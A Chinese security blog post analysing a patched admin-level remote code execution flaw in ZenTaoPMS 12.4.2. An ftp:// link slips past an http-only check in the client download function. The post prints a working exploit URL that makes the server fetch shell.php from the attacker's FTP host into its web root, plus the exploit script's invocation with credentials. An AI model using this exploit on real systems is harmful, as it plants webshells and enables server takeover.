@@ -1,0 +1,132 @@
+# ZenTaoPMS v12.4.2后台GETSHELL分析与利用
+
+阅读量 **298623**
+
+|评论 **1**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2020-12-11 10:30:41
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p2.ssl.qhimg.com/t018dd0cb41b229b00d.jpg)
+
+## 前记
+
+本文将对禅道12.4.2后台getshell漏洞进行分析，距离该版本上线已经过去2个多月，本漏洞会对12.4.2之前的版本产生影响，目前已经在新版本中修复。在复现该漏洞的时候我也读过一些网上对于该漏洞复现的文章，但是通过反复测试我发现网上所述的方法在我的环境上并不能成功复现，不知是否有情况相同的小伙伴，所以我对于漏洞点进行了审计，并成功复现，下面我们一起来分析一下。
+
+## 代码分析
+
+首先该漏洞需要后台管理员权限，所以我们首先登陆至后台。通过下图我们可以看到登陆后的界面URL为：  
+`http://192.168.52.141/zentaopms/www/index.php?m=my&f=index`
+
+![](https://p2.ssl.qhimg.com/t012b1edfbb5968327e.png)
+
+我们看到后台界面分别对m以及f参数进行传参，那么不难猜出大概就是调用my类下的index方法，我们看一下该段的代码。
+
+![](https://p1.ssl.qhimg.com/t0159e9407d7b4a59e9.png)
+
+在/module/my/lang/zh-cn.php下可以看到存在指向index的方法，这验证了我们上面猜测是正确的，那么我们下面来看一下文件下载漏洞点的代码部分。
+
+![](https://p2.ssl.qhimg.com/t01e389578003518177.png)
+
+漏洞是发生在client类下的donwload函数中，我们定位函数至/module/client/control.php中找到该方法，本段代码大致意思就是会接收三个参数version、os、link，然后去调用
+**downloadZipPackage**
+方法进行文件下载操作，并对一些下载失败事件进行不同回显，比如downloadFail，saveClientError在上图的方法列表我们可以看到他们调用的方法的具体含义，这里就不再赘述，最后如果没有失败事件时间就会返回成功。在downloadZipPackage并不需要os方法，所以这在我们后期利用时也不需要传入该参数。
+
+![](https://p1.ssl.qhimg.com/t01bc3554884a1ddd3a.png)
+
+然后继续跟进downloadZipPackage方法中，注意重点来了，漏洞真正的产生原因就在该方法中。
+
+![](https://p2.ssl.qhimg.com/t01d664441732fb42e4.png)
+
+我们可以看到这段代码首先对传入的link参数进行了base64解码操作，这里的link参数就是我们shell的远程地址，然后下面会通过一个正则表达式进行判断，link地址是否以
+http:// 或者 https:// 开头，如果存在则return返回false并退出方法，否则调用方法
+**parent::downloadZipPackage**
+，这里其实忽略了FTP这一文件下载方法，也就是说我们可以通过FTP服务代替进行文件下载操作从而绕过正则的限制。
+
+![](https://p0.ssl.qhimg.com/t01be4bcd3b62e34b7c.png)
+
+downloadZipPackage方法就没有什么问题了，就是一段文件下载函数，会通过传入的version值创建并命名在data下创建的文件夹并将下载的文件保存在其中。
+
+## 漏洞利用
+
+那么这其实就是很清晰了，通过文章开始介绍的m和f参数的调用，我们可以对client类以及download参数进行调用，并传入download参数必要的version以及link参数就可以完成漏洞的利用了。这里的link地址是base64加密后的ftp连接地址，,比如:
+
+**ftp://192.168.52.1/shell.php**
+
+大家可以直接使用python的pyftpdlib模块开启FTP服务比较方便，命令:
+
+**python -m pyftpdlib -p 21 -d .** 默认开启匿名用户，不需要输入用户名密码。
+
+![](https://p0.ssl.qhimg.com/t010ff8a21f7d431f36.png)
+
+构建exp如下:
+
+`http://ip/zentaopms/www/index.php?m=client&f=download&version=1&link=ZnRwOi8vMTkyLjE2OC41Mi4xL3NoZWxsLnBocA==`
+
+可以看到回显弹窗保存成功，然后再到靶机中查看发现下载成功，保存路径至
+
+`/zentaopms/www/data/client/1/shell.php`
+
+![](https://p1.ssl.qhimg.com/t01e196a8e5fd936c20.png)
+
+连接木马，成功利用！
+
+![](https://p4.ssl.qhimg.com/t01f672108d970a681f.png)
+
+## 漏洞利用EXP
+
+所以本文最突出的一个部分来了，就是我们有EXP啊。通过两个夜晚的努力，终于完成了，其中也碰到了不少坑，但是好在都解决了。下面由我来介绍一下他的使用方法吧。
+
+![](https://p3.ssl.qhimg.com/t01af2b24af5c3ddc4c.png)
+
+构建命令:`python "Zentao RCE EXP.py" -H http://192.168.52.141 -U admin -P Admin888
+-f 192.168.52.1`
+
+其中-H指定目标主机，-U指定后台用户名，-P指定密码，-f指定VMnet8网卡的IP，这样虚拟机才能正常访问到物理机的FTP服务，当然如果测试环境也在虚拟机中则可以修改源码自动获取IP即可，这里是以我的环境为准所以没有这么做，也因为我觉得麻烦一点来换取兼容性更好一点是不亏的，所以小伙伴可以自行修改使用，我想这也不难，源码中也标注了修改位置。目前已经上传至github，有兴趣的小伙伴可以自行下载测试。
+
+**EXP github地址:**`https://github.com/wikiZ/Zentao-RCE`
+
+## 后记
+
+本文到这里就以接近尾声了，因为最近搭建靶场，也有搭建这个漏洞，所以就想要写一下他的分析与利用这样的一篇文章，随着年龄的增长也越来越喜欢分享知识，以后也会坚持分享，这个漏洞公开并不久，当然我也并不是第一时间就进行分析，本文更加偏向教授代码审计的技巧而不仅仅只是复现，所以也希望能够对大家有所帮助，在测试中有问题的小伙伴可以私信我。最近想要找一份实习的工作(其实我是看到腾讯在招实习生被香到了)，所以最近相当投入的在沉淀学习哈哈哈。
+
+**最后祝大家都能心想事成，美梦成真！**
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **风起** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/224828](/post/id/224828)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [代码审计](/tag/代码审计)
+
+ **+1** __10赞
+
+ __收藏
+
+![](https://p4.ssl.qhimg.com/t015b155025c5f0eb59.png) 风起
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
